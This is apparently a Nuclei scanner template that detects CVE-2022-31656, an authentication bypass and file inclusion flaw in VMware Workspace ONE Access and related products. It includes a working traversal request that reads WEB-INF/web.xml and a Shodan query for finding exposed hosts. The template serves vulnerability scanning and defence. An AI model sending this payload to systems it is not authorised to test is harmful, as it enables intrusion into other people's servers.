id: CVE-2022-31656
info:
  name: VMware - Local File Inclusion
  author: DhiyaneshDk
  severity: critical
  description: VMware Workspace ONE Access, Identity Manager, and Realize Automation
    are vulnerable to local file inclusion due to an authentication bypass vulnerability,
    allowing a malicious actor with network access to potentially gain administrative
    privileges without authentication.
  reference:
  - https://petrusviet.medium.com/dancing-on-the-architecture-of-vmware-workspace-one-access-eng-ad592ae1b6dd
  - https://www.vmware.com/security/advisories/VMSA-2022-0021.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-31656
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-31656
    cwe-id: CWE-287
  metadata:
    shodan-query: http.favicon.hash:-1250474341
    verified: 'true'
    impact: The CVE-2022-31656 vulnerability in VMware Workspace ONE Access, Identity
      Manager, and Realize Automation allows attackers with network access to gain
      administrative access without authentication, leading to potential unauthorized
      access and data breaches.
    recommendation: It is recommended that VMware Workspace ONE Access, Identity Manager,
      and Realize Automation users update their systems to fix the CVE-2022-31656
      vulnerability and prevent potential unauthorized access.
  tags: cve,cve2022,vmware,lfi
requests:
- method: GET
  path:
  - '{{BaseURL}}/SAAS/t/_/;/WEB-INF/web.xml'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - <web-app
    - <servlet-name>
    condition: and
  - type: word
    part: header
    words:
    - application/xml
  - type: status
    status:
    - 200
